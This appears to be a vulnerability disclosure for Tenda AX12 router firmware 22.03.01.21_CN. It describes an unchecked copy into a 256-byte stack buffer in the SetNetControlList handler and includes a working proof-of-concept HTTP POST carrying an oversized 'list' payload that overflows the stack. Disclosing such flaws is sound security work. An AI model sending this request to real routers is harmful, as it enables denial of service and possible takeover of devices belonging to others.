# TendaAX12-22.03.01.21_CN stack overflow

## Overview

- Manufacturer's website information：https://www.tenda.com.cn/profile/contact.html
- Firmware download address ： https://www.tenda.com.cn/download/default.html



## 1.Affected version

![image](https://github.com/eeeeeeeeeeeeeeeea/IOT-vulhub/blob/main/TendaAX12/imgs/version.png)

Figure 1 shows the latest firmware Ba of the router



## 2.Vulnerability details

![image](https://github.com/eeeeeeeeeeeeeeeea/IOT-vulhub/blob/main/TendaAX12/imgs/vuln1.jpg)

The bug is in vuln1.





![image](https://github.com/eeeeeeeeeeeeeeeea/IOT-vulhub/blob/main/TendaAX12/imgs/vuln2.jpg)

sub_4151AC can send lots of list data to v2 and v2 is a important variable.Because it's used in sub_4325BC







![image](https://github.com/eeeeeeeeeeeeeeeea/IOT-vulhub/blob/main/TendaAX12/imgs/vuln3.jpg)

v14 is a local variables and size is 256(-0x208h). So,if i send lots of data to a1(such as 0x210 lengths data to a1), a1 is copied to v14 without size checking.So we can cause stack overflow here.





## 3.Recurring vulnerabilities and POC

```
POST /goform/SetNetControlList HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 55
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/net_control.html?random=0.0666579031577833&
Cookie: password=827ccb0eea8a706c4c34a16891f84e7bvemfcv

list=DESKTOP-0SR4RNF
00:e0:4c:88:24:2b
256
512aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

![image](https://github.com/eeeeeeeeeeeeeeeea/IOT-vulhub/blob/main/TendaAX12/imgs/vuln5.jpg)

that's a normal 





next,it's not normal

![image](https://github.com/eeeeeeeeeeeeeeeea/IOT-vulhub/blob/main/TendaAX12/imgs/vuln7.jpg)

